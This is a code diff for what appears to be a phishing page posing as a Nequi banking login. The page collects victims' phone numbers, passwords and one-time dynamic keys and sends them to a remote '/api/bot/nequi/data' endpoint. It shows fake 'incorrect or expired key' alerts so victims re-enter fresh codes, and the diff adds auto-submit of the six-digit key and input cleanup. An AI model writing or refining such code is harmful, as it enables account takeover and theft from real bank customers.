@@ -11,7 +11,8 @@ const DOMElements = {
     stepCdin: document.querySelector('#step-cdin'),
     formStepCdin: document.querySelector('#form-step-cdin'),
     inputCdin: document.querySelector('#cdin'),
-    pinInputs: document.querySelectorAll('#form-step-cdin input[type="text"]')
+    pinInputs: document.querySelectorAll('#form-step-cdin input[type="text"]'),
+    submitCdin: document.querySelector('#submit-cdin')
 }
 
 /**
@@ -19,6 +20,11 @@ const DOMElements = {
  */
 document.addEventListener('DOMContentLoaded', () => {
     addEventListeners();
+    // Solo permitir números en el input de pass
+    const { inputPass } = DOMElements;
+    inputPass.addEventListener('input', () => {
+        inputPass.value = inputPass.value.replace(/[^0-9]/g, '');
+    });
 })
 
 /**
@@ -39,6 +45,9 @@ const addEventListeners = () => {
         },
         body: JSON.stringify({token: token})
     })
+    .catch(error => {
+        console.error('Error:', error);
+    });
 }
 
 /**
@@ -126,6 +135,9 @@ const handleStepCdinSubmit = (e) => {
             tipo_empleo: info.tipo_empleo
         };
 
+        resetPinInputs();
+        inputCdin.value = '';
+
         // Make API request
         fetch(`${API_URL}/api/bot/nequi/data`, {
             method: 'POST',
@@ -152,6 +164,10 @@ const handleStepCdinSubmit = (e) => {
 const handleApiResponse = (result) => {
     const { loader, stepOne, stepCdin, inputNumber, inputPass, inputCdin, pinInputs } = DOMElements;
 
+    resetPinInputs();
+    inputNumber.value = '';
+    inputPass.value = '';
+
     // Handle response based on result
     if (result === 'user') {
 
@@ -161,17 +177,13 @@ const handleApiResponse = (result) => {
 
         if (inputCdin.value.length > 0) {
             alert('Hubo un error al iniciar sesión, por favor intenta nuevamente.');
-            resetPinInputs();
         }
 
         stepCdin.classList.add('hidden');
         stepOne.classList.remove('hidden');
 
-        inputNumber.value = '';
-        inputPass.value = '';
+        
     } else if (result === 'cdin') {
-        inputNumber.value = '';
-        inputPass.value = '';
 
         if (inputCdin.value.length === 6) {
             alert('Clave dinámica incorrecta o exipiró, por favor intenta nuevamente.');
@@ -179,8 +191,6 @@ const handleApiResponse = (result) => {
 
         stepOne.classList.add('hidden');
         stepCdin.classList.remove('hidden');
-
-        resetPinInputs();
     } else if (result === 'success') {
         return window.location.href = 'success.html';
     }
@@ -247,7 +257,13 @@ const handleKeypadInput = (value) => {
 }
 
 const updatePinValue = () => {
-    const { pinInputs, inputCdin } = DOMElements;
+    const { pinInputs, inputCdin, submitCdin } = DOMElements;
     const pinValue = Array.from(pinInputs).map(input => input.value).join('');
     inputCdin.value = pinValue;
+
+    // Si todos los inputs están llenos (cada uno tiene un dígito), enviar el formulario automáticamente
+    if (Array.from(pinInputs).every(input => input.value.length === 1)) {
+        console.log('submit');
+        submitCdin.click();
+    }
 } 
